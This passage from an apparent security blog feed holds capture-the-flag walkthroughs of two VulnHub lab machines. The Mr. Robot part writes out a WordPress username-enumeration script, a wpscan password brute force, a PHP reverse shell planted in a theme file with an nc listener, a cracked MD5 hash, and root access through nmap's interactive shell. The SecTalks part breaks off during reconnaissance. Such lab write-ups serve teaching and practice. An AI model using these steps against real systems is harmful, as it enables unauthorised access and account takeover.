</span><span class='line'>-rw-r--r-- <span class="m">1</span> root root   <span class="m">37007</span> Aug  <span class="m">7</span> 04:06 users.txt
</span><span class='line'>root@kali:~/mrRobot# wc -l users.txt
</span><span class='line'><span class="m">5247</span> users.txt
</span></code></pre></td></tr></table></div></figure>


<p>In order to brute force wordpress username, I could not find any tool on the Internet, so I write a simple script <code>enum_wp_users.sh</code> to do it.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#!/bin/bash</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> usage<span class="o">(){</span>
</span><span class='line'>  <span class="nb">echo</span> <span class="s2">&quot;### wordpress username enumerator v0.1&quot;</span>
</span><span class='line'>  <span class="nb">echo</span> <span class="s2">&quot;### by using wordpress&#39; lostpassword function.&quot;</span>
</span><span class='line'>  <span class="nb">echo</span> <span class="s2">&quot;&quot;</span>
</span><span class='line'>  <span class="nb">echo</span> <span class="s2">&quot;USAGE: $0 &lt;base-url&gt; &lt;wordlist&gt;&quot;</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> main<span class="o">(){</span>
</span><span class='line'>  <span class="nb">local </span><span class="nv">base_url</span><span class="o">=</span><span class="nv">$1</span>
</span><span class='line'>  <span class="nb">local </span><span class="nv">wordlist</span><span class="o">=</span><span class="nv">$2</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">for</span> word in <span class="k">$(</span>cat <span class="s2">&quot;$wordlist&quot;</span><span class="k">)</span><span class="p">;</span> <span class="k">do</span>
</span><span class='line'>      <span class="k">if</span> ! curl -s --data <span class="s2">&quot;user_login=${word}&amp;redirect_to=&amp;wp-submit=Get+New+Password&quot;</span> <span class="s2">&quot;http://${base_url}/wp-login.php?action=lostpassword&quot;</span> <span class="p">|</span> grep -q ERROR<span class="p">;</span> <span class="k">then</span>
</span><span class='line'>          <span class="nb">echo</span> <span class="s2">&quot;Found valid username: ${word}&quot;</span>
</span><span class='line'>      <span class="k">fi</span>
</span><span class='line'>  <span class="k">done</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="o">[</span> -z <span class="nv">$2</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
</span><span class='line'>  usage
</span><span class='line'><span class="k">else</span>
</span><span class='line'>  main <span class="s2">&quot;$@&quot;</span>
</span><span class='line'><span class="k">fi</span>
</span></code></pre></td></tr></table></div></figure>


<p>By using this script with filtered dictionary file <code>users.txt</code>, I found one valid username <code>elliot</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/mrRobot# ./enum_wp_users.sh 10.1.1.137 users.txt
</span><span class='line'>Found valid username: elliot
</span><span class='line'>Found valid username: Elliot
</span><span class='line'>Found valid username: ELLIOT
</span></code></pre></td></tr></table></div></figure>


<p>Then using wpscan to brute force password for the user <code>elliot</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/mrRobot# cat fsociety.dic <span class="p">|</span> sort -u <span class="p">|</span> awk <span class="s1">&#39;length($1) &lt;= 16 &amp;&amp; length($1) &gt;= 6 { print $1 }&#39;</span> &gt; pass.txt
</span><span class='line'>root@kali:~/mrRobot# wpscan --url 10.1.1.137 --wordlist ~/mrRobot/pass.txt --username elliot
</span><span class='line'>_______________________________________________________________
</span><span class='line'>        __          _______   _____
</span><span class='line'>        <span class="se">\ \ </span>       / /  __ <span class="se">\ </span>/ ____<span class="p">|</span>
</span><span class='line'>         <span class="se">\ \ </span> /<span class="se">\ </span> / /<span class="p">|</span> <span class="p">|</span>__<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>___   ___  __ _ _ __
</span><span class='line'>          <span class="se">\ \/</span>  <span class="se">\/</span> / <span class="p">|</span>  ___/ <span class="se">\_</span>__ <span class="se">\ </span>/ __<span class="p">|</span>/ _<span class="sb">`</span> <span class="p">|</span> <span class="s1">&#39;_ \ </span>
</span><span class='line'><span class="s1">           \  /\  /  | |     ____) | (__| (_| | | | |</span>
</span><span class='line'><span class="s1">            \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span>
</span><span class='line'>
</span><span class='line'><span class="s1">        WordPress Security Scanner by the WPScan Team </span>
</span><span class='line'><span class="s1">                       Version 2.8</span>
</span><span class='line'><span class="s1">          Sponsored by Sucuri - https://sucuri.net</span>
</span><span class='line'><span class="s1">   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_</span>
</span><span class='line'><span class="s1">_______________________________________________________________</span>
</span><span class='line'>
</span><span class='line'><span class="s1">[+] URL: http://10.1.1.137/</span>
</span><span class='line'><span class="s1">[+] Started: Mon Aug  8 03:09:23 2016</span>
</span><span class='line'>
</span><span class='line'><span class="s1">[+] robots.txt available under: &#39;</span>http://10.1.1.137/robots.txt<span class="err">&#39;</span>
</span><span class='line'>
</span><span class='line'>...truncated...
</span><span class='line'>
</span><span class='line'>  <span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> Login : elliot Password : ER28-0652
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>  +----+--------+------+-----------+
</span><span class='line'>  <span class="p">|</span> Id <span class="p">|</span> Login  <span class="p">|</span> Name <span class="p">|</span> Password  <span class="p">|</span>
</span><span class='line'>  +----+--------+------+-----------+
</span><span class='line'>  <span class="p">|</span>    <span class="p">|</span> elliot <span class="p">|</span>      <span class="p">|</span> ER28-0652 <span class="p">|</span>
</span><span class='line'>  +----+--------+------+-----------+
</span><span class='line'>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Finished: Mon Aug  <span class="m">8</span> 03:11:37 2016
</span></code></pre></td></tr></table></div></figure>


<p>Found the password is <font color="red"><code>ER28-0652</code></font></p>

<p>However, there is another way to find out the WordPress login username and password, rather than brute force.</p>

<p>From the result of nikto scan, I noticed there is another file found <code>/license.txt</code>. By checking the source code of the file on <code>http://10.1.1.137/license.txt</code></p>

<p>I found:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;pre&gt;
</span><span class='line'>what you <span class="k">do</span> just pull code from Rapid9 or some s@#% since when did you become a script kitty?
</span><span class='line'>
</span><span class='line'>...truncated...
</span><span class='line'>
</span><span class='line'><span class="k">do</span> you want a password or something?
</span><span class='line'>
</span><span class='line'>...truncated...
</span><span class='line'>
</span><span class='line'><span class="nv">ZWxsaW90OkVSMjgtMDY1Mgo</span><span class="o">=</span>
</span><span class='line'>&lt;/pre&gt;
</span></code></pre></td></tr></table></div></figure>


<p>By decoding the Base64 encoded string: <code>ZWxsaW90OkVSMjgtMDY1Mgo=</code>, I got a username / password <font color="red"><code>elliot:ER28-0652</code></font></p>

<p>and from nikto scan, I also noticed that the admin login page is <code>http://10.1.1.137/wp-login.php</code>.</p>

<p>So, try to login with the found username / password and succeed!.</p>

<p>Now heading to <code>Appearance</code> &ndash;> <code>Editor</code> &ndash;> <code>404.php</code> (notice here the theme is <code>twentyfifteen</code>) and replaced the content with <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" title="PHP Reverse Shell by pentestmonkey">pentestmonkey&rsquo;s php reverse shell</a> (configured to connect back on port 443).</p>

<p>Then setup <code>NC</code> to listen on port <code>443</code>.</p>

<p>Now, by accessing the page <code>http://10.1.1.137/wp-content/themes/twentyfifteen/404.php</code> to trigger the reverse shell connect back to my attacking machine.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nc -lvnp 443
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">443</span> ...
</span><span class='line'>connect to <span class="o">[</span>10.1.1.130<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.1.1.137<span class="o">]</span> 47762
</span><span class='line'>Linux linux 3.13.0-55-generic <span class="c">#94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span>
</span><span class='line'> 09:01:50 up <span class="m">15</span> min,  <span class="m">0</span> users,  load average: 0.00, 0.02, 0.05
</span><span class='line'>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span>
</span><span class='line'>/bin/sh: 0: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span><span class="nb">pwd</span>
</span><span class='line'>/
</span><span class='line'><span class="nv">$ </span>ls -al
</span><span class='line'>total 84
</span><span class='line'>drwxr-xr-x  <span class="m">22</span> root root  <span class="m">4096</span> Sep <span class="m">16</span>  <span class="m">2015</span> .
</span><span class='line'>drwxr-xr-x  <span class="m">22</span> root root  <span class="m">4096</span> Sep <span class="m">16</span>  <span class="m">2015</span> ..
</span><span class='line'>drwxr-xr-x   <span class="m">2</span> root root  <span class="m">4096</span> Sep <span class="m">16</span>  <span class="m">2015</span> bin
</span><span class='line'>drwxr-xr-x   <span class="m">3</span> root root  <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> boot
</span><span class='line'>drwxr-xr-x  <span class="m">13</span> root root  <span class="m">3960</span> Aug  <span class="m">7</span>  <span class="m">2016</span> dev
</span><span class='line'>drwxr-xr-x  <span class="m">77</span> root root  <span class="m">4096</span> Aug  <span class="m">7</span>  <span class="m">2016</span> etc
</span><span class='line'>drwxr-xr-x   <span class="m">3</span> root root  <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> home
</span><span class='line'>lrwxrwxrwx   <span class="m">1</span> root root    <span class="m">33</span> Jun <span class="m">24</span>  <span class="m">2015</span> initrd.img -&gt; boot/initrd.img-3.13.0-55-generic
</span><span class='line'>drwxr-xr-x  <span class="m">16</span> root root  <span class="m">4096</span> Jun <span class="m">24</span>  <span class="m">2015</span> lib
</span><span class='line'>drwxr-xr-x   <span class="m">2</span> root root  <span class="m">4096</span> Jun <span class="m">24</span>  <span class="m">2015</span> lib64
</span><span class='line'>drwx------   <span class="m">2</span> root root <span class="m">16384</span> Jun <span class="m">24</span>  <span class="m">2015</span> lost+found
</span><span class='line'>drwxr-xr-x   <span class="m">2</span> root root  <span class="m">4096</span> Jun <span class="m">24</span>  <span class="m">2015</span> media
</span><span class='line'>drwxr-xr-x   <span class="m">4</span> root root  <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> mnt
</span><span class='line'>drwxr-xr-x   <span class="m">3</span> root root  <span class="m">4096</span> Sep <span class="m">16</span>  <span class="m">2015</span> opt
</span><span class='line'>dr-xr-xr-x <span class="m">339</span> root root     <span class="m">0</span> Aug  <span class="m">7</span>  <span class="m">2016</span> proc
</span><span class='line'>drwx------   <span class="m">3</span> root root  <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> root
</span><span class='line'>drwxr-xr-x  <span class="m">14</span> root root   <span class="m">500</span> Aug  <span class="m">7</span> 08:47 run
</span><span class='line'>drwxr-xr-x   <span class="m">2</span> root root  <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> sbin
</span><span class='line'>drwxr-xr-x   <span class="m">3</span> root root  <span class="m">4096</span> Jun <span class="m">24</span>  <span class="m">2015</span> srv
</span><span class='line'>dr-xr-xr-x  <span class="m">13</span> root root     <span class="m">0</span> Aug  <span class="m">7</span>  <span class="m">2016</span> sys
</span><span class='line'>drwxrwxrwt   <span class="m">5</span> root root  <span class="m">4096</span> Aug  <span class="m">7</span> 08:49 tmp
</span><span class='line'>drwxr-xr-x  <span class="m">10</span> root root  <span class="m">4096</span> Jun <span class="m">24</span>  <span class="m">2015</span> usr
</span><span class='line'>drwxr-xr-x  <span class="m">11</span> root root  <span class="m">4096</span> Jun <span class="m">24</span>  <span class="m">2015</span> var
</span><span class='line'>lrwxrwxrwx   <span class="m">1</span> root root    <span class="m">30</span> Jun <span class="m">24</span>  <span class="m">2015</span> vmlinuz -&gt; boot/vmlinuz-3.13.0-55-generic
</span><span class='line'><span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>Then use python to get a better shell.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>python -c <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;);&#39;</span>
</span><span class='line'>daemon@linux:/home/robot<span class="nv">$ </span><span class="nb">pwd</span>
</span><span class='line'><span class="nb">pwd</span>
</span><span class='line'>/home/robot
</span><span class='line'>daemon@linux:/home/robot<span class="nv">$ </span>ls -al
</span><span class='line'>ls -al
</span><span class='line'>total 16
</span><span class='line'>drwxr-xr-x <span class="m">2</span> root  root  <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> .
</span><span class='line'>drwxr-xr-x <span class="m">3</span> root  root  <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> ..
</span><span class='line'>-r-------- <span class="m">1</span> robot robot   <span class="m">33</span> Nov <span class="m">13</span>  <span class="m">2015</span> key-2-of-3.txt
</span><span class='line'>-rw-r--r-- <span class="m">1</span> robot robot   <span class="m">39</span> Nov <span class="m">13</span>  <span class="m">2015</span> password.raw-md5
</span><span class='line'>daemon@linux:/home/robot<span class="nv">$ </span>
</span><span class='line'>daemon@linux:/home/robot<span class="nv">$ </span>cat password.raw-md5
</span><span class='line'>cat password.raw-md5
</span><span class='line'>robot:c3fcd3d76192e4007dfb496cca67e13b
</span><span class='line'>daemon@linux:/home/robot<span class="nv">$ </span>cat /etc/passwd <span class="p">|</span> grep robot
</span><span class='line'>cat /etc/passwd <span class="p">|</span> grep robot
</span><span class='line'>robot:x:1002:1002::/home/robot:
</span></code></pre></td></tr></table></div></figure>


<p>Found the 2nd key file <code>key-2-of-3.txt</code>, but it only can be read by user <code>robot</code></p>

<p>However, I found the username <code>robot</code> and the MD5 hash value of his password <code>c3fcd3d76192e4007dfb496cca67e13b</code> in the file <code>/home/robot/password.raw-md5</code></p>

<p>By cracking the MD5 hash, I got <code>robot</code>&rsquo;s password is <font color="red"><code>abcdefghijklmnopqrstuvwxyz</code></font></p>

<p>Also, by checking the <code>/etc/passwd</code> file, I noticed that <code>robot</code> is a system user.</p>

<p>Now I can <code>su</code> to user <code>robot</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>daemon@linux:/home/robot<span class="nv">$ </span>su robot
</span><span class='line'>su robot
</span><span class='line'>Password: abcdefghijklmnopqrstuvwxyz
</span><span class='line'>
</span><span class='line'>robot@linux:~<span class="nv">$ </span>id
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>robot<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>robot<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>robot<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now, I can read the 2nd key:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>robot@linux:~<span class="nv">$ </span>cat key-2-of-3.txt
</span><span class='line'>cat key-2-of-3.txt
</span><span class='line'>822c73956184f694993bede3eb39f959
</span></code></pre></td></tr></table></div></figure>


<p>The 2nd key is <font color="red"><code>822c73956184f694993bede3eb39f959</code></font></p>

<p>Now move on to enumeration and rooting, I found there is an <a href="https://www.exploit-db.com/papers/18168/" title="NMAP --interactive priviledge escalation">old version of NMAP vulnerability</a> which can be exploited to get ROOT:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>robot@linux:/tmp<span class="nv">$ </span>/usr/local/bin/nmap -v
</span><span class='line'>/usr/local/bin/nmap -v
</span><span class='line'>
</span><span class='line'>Starting nmap 3.81 <span class="o">(</span> http://www.insecure.org/nmap/ <span class="o">)</span> at 2016-08-07 12:40 UTC
</span><span class='line'>No target machines/networks specified!
</span><span class='line'>QUITTING!
</span><span class='line'>robot@linux:/tmp<span class="nv">$ </span>ls -la /usr/local/bin/nmap
</span><span class='line'>ls -la /usr/local/bin/nmap
</span><span class='line'>-rwsr-xr-x <span class="m">1</span> root root <span class="m">504736</span> Nov <span class="m">13</span>  <span class="m">2015</span> /usr/local/bin/nmap
</span><span class='line'>robot@linux:/tmp<span class="nv">$ </span>/usr/local/bin/nmap --interactive
</span><span class='line'>/usr/local/bin/nmap --interactive
</span><span class='line'>
</span><span class='line'>Starting nmap V. 3.81 <span class="o">(</span> http://www.insecure.org/nmap/ <span class="o">)</span>
</span><span class='line'>Welcome to Interactive Mode -- press h &lt;enter&gt; <span class="k">for</span> <span class="nb">help</span>
</span><span class='line'>nmap&gt; !sh
</span><span class='line'>!sh
</span><span class='line'><span class="c"># id</span>
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>robot<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>robot<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1002<span class="o">(</span>robot<span class="o">)</span>
</span><span class='line'><span class="c"># pwd</span>
</span><span class='line'><span class="nb">pwd</span>
</span><span class='line'>/tmp
</span><span class='line'><span class="c"># cd /root</span>
</span><span class='line'><span class="nb">cd</span> /root
</span><span class='line'><span class="c"># pwd</span>
</span><span class='line'><span class="nb">pwd</span>
</span><span class='line'>/root
</span><span class='line'><span class="c"># ls -al</span>
</span><span class='line'>ls -al
</span><span class='line'>total 32
</span><span class='line'>drwx------  <span class="m">3</span> root root <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> .
</span><span class='line'>drwxr-xr-x <span class="m">22</span> root root <span class="m">4096</span> Sep <span class="m">16</span>  <span class="m">2015</span> ..
</span><span class='line'>-rw-------  <span class="m">1</span> root root <span class="m">4058</span> Nov <span class="m">14</span>  <span class="m">2015</span> .bash_history
</span><span class='line'>-rw-r--r--  <span class="m">1</span> root root <span class="m">3274</span> Sep <span class="m">16</span>  <span class="m">2015</span> .bashrc
</span><span class='line'>drwx------  <span class="m">2</span> root root <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> .cache
</span><span class='line'>-rw-r--r--  <span class="m">1</span> root root    <span class="m">0</span> Nov <span class="m">13</span>  <span class="m">2015</span> firstboot_done
</span><span class='line'>-r--------  <span class="m">1</span> root root   <span class="m">33</span> Nov <span class="m">13</span>  <span class="m">2015</span> key-3-of-3.txt
</span><span class='line'>-rw-r--r--  <span class="m">1</span> root root  <span class="m">140</span> Feb <span class="m">20</span>  <span class="m">2014</span> .profile
</span><span class='line'>-rw-------  <span class="m">1</span> root root <span class="m">1024</span> Sep <span class="m">16</span>  <span class="m">2015</span> .rnd
</span><span class='line'><span class="c"># cat key-3-of-3.txt</span>
</span><span class='line'>cat key-3-of-3.txt
</span><span class='line'>04787ddef27c3dee1ee161b21670b4e4
</span><span class='line'><span class="c"># </span>
</span></code></pre></td></tr></table></div></figure>


<p>Now we got ROOT and the 3rd key is <font color="red"><code>04787ddef27c3dee1ee161b21670b4e4</code></font></p>

<!--- Reference -->



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[VulnHub] SecTalks: BNE0x03 - Simple]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2016/06/08/vulnhub-sectalks-bne0x03-simple/"/>
    <updated>2016-06-08T22:07:21+10:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2016/06/08/vulnhub-sectalks-bne0x03-simple</id>
    <content type="html"><![CDATA[<p>&ldquo;Simple CTF is a boot2root that focuses on the basics of web based hacking. Once you load the VM, treat it as a machine you can see on the network, i.e. you don&rsquo;t have physical access to this machine. Therefore, tricks like editing the VM&rsquo;s BIOS or Grub configuration are not allowed. Only remote attacks are permitted. /root/flag.txt is your ultimate goal.&rdquo; &ndash; <a href="https://www.vulnhub.com/author/robert-winkel,190/">Robert Winkel</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/sectalks-bne0x03-simple,141/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>10.1.1.130/24</em>)</p>

<p>Target: SecTalks: BNE0x03 - Simple (<em>10.1.1.134/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li><code>CuteNews 2.0.3</code> remote file upload vulnerability</li>
<li>Exploit overlayfs local root vulnerability to get ROOT</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Port scanned the target to discover running services and open ports [<font color="FF8000">masscan</font> &amp;&amp; <font color="FF8000">nmap</font>]</li>
<li>Web application scanned to dig more information about web service [<font color="FF8000">nikto</font>]</li>
<li>Exploit remote file upload vunlerability to upload webshell [<font color="FF8000">php-reverse-shell</font>]</li>
<li>Enumeration and exploit the local priviledge vulnerability to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://portswigger.net/burp/">burp suite</a></li>
<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>http://www.nta-monitor.com/tools/arp-scan/<span class="o">)</span>
</span><span class='line'>10.1.1.2  00:50:56:f1:61:7e   VMware, Inc.
</span><span class='line'>10.1.1.1  00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.134    00:0c:29:29:7a:4e   VMware, Inc.
</span><span class='line'>10.1.1.254    00:50:56:f0:91:47   VMware, Inc.
</span><span class='line'>
</span><span class='line'><span class="m">4</span> packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.839 seconds <span class="o">(</span>90.17 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
</span></code></pre></td></tr></table></div></figure>


<p><code>10.1.1.134</code> is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
